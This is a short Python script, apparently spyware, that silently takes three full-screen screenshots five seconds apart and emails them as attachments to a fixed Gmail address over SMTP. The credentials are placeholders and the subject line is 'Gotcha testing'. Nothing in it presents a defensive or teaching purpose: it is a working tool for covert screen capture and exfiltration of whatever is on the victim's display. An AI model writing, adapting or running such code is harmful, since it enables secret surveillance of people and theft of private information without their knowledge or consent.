import wx
import os
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Constants for Gmail
FROM = "from_email@gmail.com"
TO = "to_email@gmail.com"
SUBJECT = "Gotcha testing"
PASSWORD = "YourGmailPassword"

# Function to take a screenshot
def take_screenshot(file_name):
    app = wx.App(False)
    screen = wx.ScreenDC()
    size = screen.GetSize()
    bmap = wx.Bitmap(size[0], size[1])
    memo = wx.MemoryDC(bmap)
    memo.Blit(0, 0, size[0], size[1], screen, 0, 0)
    del memo
    bmap.SaveFile(file_name, wx.BITMAP_TYPE_PNG)

# Function to send email
def send_email(file_names):
    msg = MIMEMultipart()
    msg['From'] = FROM
    msg['To'] = TO
    msg['Subject'] = SUBJECT

    for file_name in file_names:
        part = MIMEBase('application', "octet-stream")
        part.set_payload(open(file_name, "rb").read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment' ,filename=str(file_name))
        msg.attach(part) 

    smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
    smtpObj.ehlo()
    smtpObj.starttls()
    smtpObj.login(FROM, PASSWORD)
    smtpObj.sendmail(FROM, TO, msg.as_string())
    smtpObj.quit()

# Main function
if __name__ == "__main__":
    screenshots = []
    for i in range(3):
        file_name = f"grabbed_{i}.png"
        take_screenshot(file_name)
        screenshots.append(file_name)
        # Wait 5 seconds until taking next screenshot
        time.sleep(5)
    send_email(screenshots)
